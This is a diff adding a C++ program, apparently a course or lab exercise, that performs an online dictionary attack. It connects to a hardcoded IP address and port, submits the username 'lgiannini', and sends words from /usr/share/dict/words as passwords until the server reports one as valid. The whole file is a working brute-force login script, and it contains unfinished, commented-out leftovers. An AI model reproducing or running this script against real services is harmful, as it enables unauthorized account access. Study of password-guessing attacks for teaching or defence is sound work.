@@ -1,0 +1,267 @@
+#include <string.h>
+#include <iostream>
+#include <string>
+#include <fstream>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <iomanip>
+#include <thread>
+#include <cstring>
+using namespace std;
+
+
+string* passwords;
+int size;
+int count = 0;
+int main(void) {
+
+
+  // read in file of dictionary and put in string array
+  // pass index of array into encrypt function
+  // put into char array and fill with \0
+  // put in two arrays to check if incorrect/correct answer
+  // 466550 size -> if dont work, get more words
+
+
+
+  //make ifstream to get file and fill array
+  ifstream in("/usr/share/dict/words");
+  string temp;
+  size = 0;
+  while(getline(in,temp))
+    {
+      if(temp.length() < 11 && islower(temp[0]))
+	{
+	  size++;
+	}
+    }
+  
+  in.close();
+  
+  passwords = new string[size];
+
+  in.open("/usr/share/dict/words");
+  int counter = 0;
+  while(getline(in,temp))
+    {
+      if(temp.length() < 11 && islower(temp[0]))
+	{
+	  passwords[counter] = temp;
+	  counter++;
+	}
+    }
+  
+  // create socket
+  int cs = socket(PF_INET,SOCK_STREAM,0);
+
+  // debug if no connection
+  if (cs <= 0)
+  {
+    cout << "client: Socket creation failed." << endl;
+    exit(-1);
+  }
+
+
+  sockaddr_in address;
+  int addressSize = sizeof(sockaddr);
+  address.sin_family=AF_INET;
+  address.sin_port = htons(7500);
+  inet_pton(AF_INET,"52.25.223.40",&address.sin_addr);
+
+  // connect
+  int rc = connect(cs,(struct sockaddr*) &address, addressSize);
+  if(rc != 0)
+  {
+    cout << "client: connect failed, bad server address/bad port #" << endl;
+    exit(-1);
+  }
+  
+  cout << "client: server and client have established communication..." << endl;
+
+  
+  const int BUFFER_LENGTH = 1024;
+  char buffer[BUFFER_LENGTH];
+  int countSpot2 = 0;
+  string v = " vaild ";
+  do
+  {
+    
+    // recv server prompting userid
+    recv(cs,buffer,BUFFER_LENGTH,0);
+    cout << "server sent ->  " << buffer << endl;
+    
+    
+
+    // char array to make sure buffer sent userid: prompt	
+    char userID[BUFFER_LENGTH];
+    userID[0] = 'u';
+    userID[1] = 's';
+    userID[2] = 'e';
+    userID[3] = 'r';
+    userID[4] = 'i';
+    userID[5] = 'd';
+    userID[6] = ':';
+
+    for(int i = 7; i < 1024; i++) {
+      userID[i] = '\0';
+    }
+    
+    
+    // check if buffer == userid:
+    // if so, put tgrable into char array and append \0
+    // then send
+    int checkUserid = strcmp(buffer,userID);
+    if(checkUserid == 0) {
+      cout << "I sent -> lgiannini"  << endl;
+      string s = "lgiannini";
+     	  
+            
+      char buffer1[BUFFER_LENGTH];
+      buffer1[0] = 'l';
+      buffer1[1] = 'g';
+      buffer1[2] = 'i';
+      buffer1[3] = 'a';
+      buffer1[4] = 'n';
+      buffer1[5] = 'n';
+      buffer1[6] = 'i';
+      buffer1[7] = 'n';
+      buffer1[8] = 'i';
+      for(int i = 9; i < 1024; i++) {	
+	buffer1[i] = '\0';
+      }
+      
+      
+      
+      send(cs,buffer1,BUFFER_LENGTH,0);
+      
+    }
+    
+    // password prompt
+    recv(cs,buffer,BUFFER_LENGTH,0);
+    cout << "server sent ->  " << buffer << endl;
+
+    // char array to make sure server prompting for password
+    char pass[BUFFER_LENGTH];
+    pass[0] = 'p';
+    pass[1] = 'a';
+    pass[2] = 's';
+    pass[3] = 's';
+    pass[4] = 'w';
+    pass[5] = 'o';
+    pass[6] = 'r';
+    pass[7] = 'd';
+    pass[8] = ':';
+    
+    for(int i = 9; i < 1024; i++) {
+      pass[i] = '\0';
+    }
+
+
+    // if correct, get string from dict array
+    // pass into encrypt function along with salt
+    // put into char array and append \0
+    char temp[BUFFER_LENGTH];
+    int checkServer = strcmp(buffer,pass);
+    string toPrint = "";
+    if(checkServer == 0) {
+      
+      // put the first 10 characters of encrypted password into char array to then use
+      // and string to print
+
+
+  
+      cout << "I sent -> " << toPrint << endl;
+            
+      
+      // hard code put in char array what the server responds with for wrong password
+      // append \0 at end
+      /*
+      temp[0] = '[';
+      temp[1] = 'l';
+      temp[2] = 'g';
+      temp[3] = 'i';
+      temp[4] = 'a';
+      temp[5] = 'n';
+      temp[6] = 'n';
+      temp[7] = 'i';
+      temp[8] = 'n';
+      temp[9] = 'i';
+      temp[10] = '/';
+      temp[11] = arrayEnc[0];
+      temp[12] = arrayEnc[1];
+      temp[13] = arrayEnc[2];
+      temp[14] = arrayEnc[3];
+      temp[15] = arrayEnc[4];
+      temp[16] = arrayEnc[5];
+      temp[17] = arrayEnc[6];
+      temp[18] = arrayEnc[7];
+      //temp[17] = arrayEnc[8];
+      //temp[18] = arrayEnc[9];
+      temp[19] = ']';
+      temp[20] = ' ';
+      temp[21] = 'v';
+      temp[22] = 'a';
+      temp[23] = 'l';
+      temp[24] = 'i';
+      temp[25] = 'd';
+      temp[26] = ' ';
+      temp[27] = 'p';
+      temp[28] = 'a';
+      temp[29] = 's';
+      temp[30] = 's';
+      temp[31] = 'w';
+      temp[32] = 'o';
+      temp[33] = 'r';
+      temp[34] = 'd';
+      temp[35] = '\n';
+      
+      for(int i = 36; i < 1024; i++) {
+	temp[i] = '\0';
+      } */                                 
+      strcpy(buffer,passwords[count].c_str());
+      send(cs,buffer,BUFFER_LENGTH,0);
+    }
+    
+    // result of password
+    recv(cs,buffer,BUFFER_LENGTH,0);
+    cout << "server sent ->  " << buffer << endl;
+    cout << "Count: " << count << endl;
+    
+    // write to file to double check if valid if statement doesn't work
+    ofstream outfile;
+    outfile.open("results5.txt",ios_base::app);
+    outfile << buffer;
+    
+    
+    // check if valid password
+    // one check if the buffer == temp
+    // second check is if v is in buffer pos 21 -> if invalid, will be i  .. valid will be v
+    
+    char * p = strstr(buffer," valid ");
+  if(p != NULL)
+    {
+      cout << "FOUND -> " << passwords[count] << endl;
+      close(cs);
+      break;
+	  
+    }
+    count++;
+   	
+    
+  } while(true);
+  close(cs);
+
+  
+
+  return 1;
+
+
+
+  
+
+
+
+
+}//main
